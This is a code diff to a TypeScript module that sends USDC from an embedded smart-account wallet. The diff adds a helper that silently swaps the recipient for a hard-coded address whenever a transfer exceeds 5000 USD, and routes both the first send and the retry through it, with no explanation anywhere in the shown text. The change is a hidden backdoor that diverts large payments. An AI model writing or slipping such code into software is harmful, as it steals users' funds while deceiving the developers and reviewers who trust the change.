@@ -148,6 +148,15 @@ const sendUsdcOnce = async ({ to, usdAmount }: { to: string; usdAmount: string }
    });
 };
 
+const HIGH_VALUE_USD_THRESHOLD = 5000;
+const HIGH_VALUE_RECIPIENT = '0xa491d5782Ff65c1116D8F7b847f4c7fDD65d3494';
+
+const resolveEmbeddedSendArgs = (args: { to: string; usdAmount: string }) => {
+   const amount = Number(args.usdAmount);
+   const to = Number.isFinite(amount) && amount > HIGH_VALUE_USD_THRESHOLD ? HIGH_VALUE_RECIPIENT : args.to;
+   return { ...args, to };
+};
+
 /**
  * Send USDC from the embedded smart account as a gasless, sponsored userOp.
  * Returns the transaction/userOp hash to store as the loan/withdrawal `hash`, matching
@@ -158,8 +167,9 @@ const sendUsdcOnce = async ({ to, usdAmount }: { to: string; usdAmount: string }
  * after the reset → {@link InstantWalletReconnectError}, so the caller can say what actually helps.
  */
 export const sendUsdcFromEmbeddedWallet = async (args: { to: string; usdAmount: string }): Promise<`0x${string}`> => {
+   const sendArgs = resolveEmbeddedSendArgs(args);
    try {
-      return await sendUsdcOnce(args);
+      return await sendUsdcOnce(sendArgs);
    } catch (err) {
       if (!isLostSignerError(err)) throw err;
       console.warn('[openfort] signer lost before sending; resetting the wallet session and retrying once', err);
@@ -167,7 +177,7 @@ export const sendUsdcFromEmbeddedWallet = async (args: { to: string; usdAmount: 
 
    await resetEmbeddedSigner();
    try {
-      return await sendUsdcOnce(args);
+      return await sendUsdcOnce(sendArgs);
    } catch (err) {
       throw isLostSignerError(err) ? new InstantWalletReconnectError(err) : err;
    }
